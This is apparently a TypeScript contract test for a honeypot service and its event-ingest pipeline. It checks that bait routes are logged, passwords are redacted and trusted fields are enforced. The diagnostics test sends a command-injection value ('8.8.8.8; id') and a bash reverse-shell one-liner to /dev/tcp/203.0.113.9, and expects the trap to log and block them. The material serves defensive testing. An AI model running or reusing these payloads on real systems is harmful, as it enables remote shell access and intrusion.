// Contract test across C's upstream boundary (A -> C), ported to the TS ingest.
// The real trap (apps/trap/server.mjs) posts to the real registerIngestRoutes,
// with a fake ClickHouse writer capturing rows. If A's event broke C's schema,
// C would 400 and the trap would 503, so "trap got 200 AND C captured a valid
// row" proves the wire contract.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import path from 'node:path';
import Fastify, { type FastifyInstance } from 'fastify';
import type { ClickHouseClient } from '@clickhouse/client';
// @ts-expect-error — A's trap is plain JS with no type declarations.
import { createTrap } from '../apps/trap/server.mjs';
import { setClientsForTest } from '../apps/control/clickhouse';
import { registerIngestRoutes, insertShellTurn } from '../apps/control/ingest';

const dir = path.dirname(fileURLToPath(import.meta.url));
const MAP = JSON.parse(readFileSync(path.join(dir, '..', 'packages', 'trap', 'response-map.json'), 'utf8'));
const ADMIN_TOKEN = JSON.parse(MAP['GET /api/env'].body).ADMIN_TOKEN as string;
const SID = '00000000-0000-4000-8000-0000000000c1';
const INGEST_TOKEN = 'producer-tok';

const inserts: { table: string; values: any[] }[] = [];
const fakeWriter = { insert: async (o: { table: string; values: any[] }) => { inserts.push(o); return {} as any; } } as unknown as ClickHouseClient;
const captured = () => inserts.filter((i) => i.table === 'events').flatMap((i) => i.values);
const lastFor = (route: string, template: string) => captured().find((e) => e.route === route && e.response_template === template);

let control: FastifyInstance, trap: any, trapBase: string;
before(async () => {
  process.env.CLICKHOUSE_URL = 'http://fake';
  process.env.CLICKHOUSE_USER = 'u';
  process.env.INGEST_TOKEN = INGEST_TOKEN;
  setClientsForTest({ writer: fakeWriter });
  control = Fastify();
  registerIngestRoutes(control);
  await control.ready();
  const addr = await control.listen({ port: 0, host: '127.0.0.1' });
  trap = createTrap({
    DEMO_MODE: 'true', TRAP_INSTANCE_ID: 'contract-1', INGEST_TOKEN,
    INGEST_URL: `${addr}/v1/events/batch`, CALLBACK_ALLOWLIST: '', REVSHELL_HOLD_MS: '0', BODY_LIMIT_BYTES: '16384'
  });
  trapBase = await new Promise((r) => trap.listen(0, '127.0.0.1', () => r(`http://127.0.0.1:${trap.address().port}`)));
});
after(async () => { trap.close(); await control.close(); setClientsForTest(null); });

const hit = (p: string, o: { method?: string; body?: string; token?: string } = {}) =>
  fetch(trapBase + p, {
    method: o.method ?? 'GET',
    headers: { 'x-demo-session': SID, 'content-type': 'application/json', ...(o.token ? { authorization: `Bearer ${o.token}` } : {}) },
    body: o.body
  });

test('A->C: three bait routes captured; server forces trusted fields', async () => {
  const r = await Promise.all([
    hit('/api/login', { method: 'POST', body: '{"user":"a","password":"hunter2"}' }),
    hit('/api/env'),
    hit('/api/exec', { method: 'POST', body: '{"task":"demo-action"}' })
  ]);
  assert.deepEqual(r.map((x) => x.status), [200, 200, 200], 'non-200 would mean C rejected the event');
  for (const [route, template] of [['/api/login', 'fake-admin-token'], ['/api/env', 'fake-env-values'], ['/api/exec', 'fake-command-success']]) {
    const row = lastFor(route, template);
    assert.ok(row, `no captured event for ${route}`);
    assert.equal(row.session_id, SID);
    assert.equal(row.source, 'trap_http');
    assert.equal(row.origin_label, 'live_demo', 'C forces live_demo regardless of what A sent');
    assert.ok(row.received_at);
  }
  assert.ok(!captured().some((e) => e.payload_text.includes('hunter2')), 'password redacted across the wire');
});

test('A->C: diagnostics ping, injection, and blocked reverse-shell are captured', async () => {
  assert.equal((await hit('/api/admin/diagnostics', { method: 'POST', token: ADMIN_TOKEN, body: '{"host":"8.8.8.8"}' })).status, 200);
  assert.ok(lastFor('/api/admin/diagnostics', 'diag-ping'));
  assert.equal((await hit('/api/admin/diagnostics', { method: 'POST', token: ADMIN_TOKEN, body: '{"host":"8.8.8.8; id"}' })).status, 200);
  assert.ok(lastFor('/api/admin/diagnostics', 'diag-injected'));
  assert.equal((await hit('/api/admin/diagnostics', { method: 'POST', token: ADMIN_TOKEN, body: JSON.stringify({ host: 'x; bash -i >& /dev/tcp/203.0.113.9/4444 0>&1' }) })).status, 200);
  assert.ok(lastFor('/api/admin/diagnostics', 'revshell-blocked'));
});

test('C->B: a shell turn as B builds it is accepted by insertShellTurn()', async () => {
  inserts.length = 0;
  await insertShellTurn({
    turn_id: '00000000-0000-4000-8000-0000000000b1', session_id: SID, seq: 0,
    received_at: new Date().toISOString(), command: 'id', output: 'uid=1000(node)\n',
    cwd: '/app', served_by: 'fast_path', latency_ms: 35, origin_label: 'live_demo',
    guild_session_id: '', guild_event_id: ''
  });
  const row = inserts.find((i) => i.table === 'shell_turns');
  assert.ok(row, 'turn was inserted');
  assert.equal(row.values[0].served_by, 'fast_path');
});
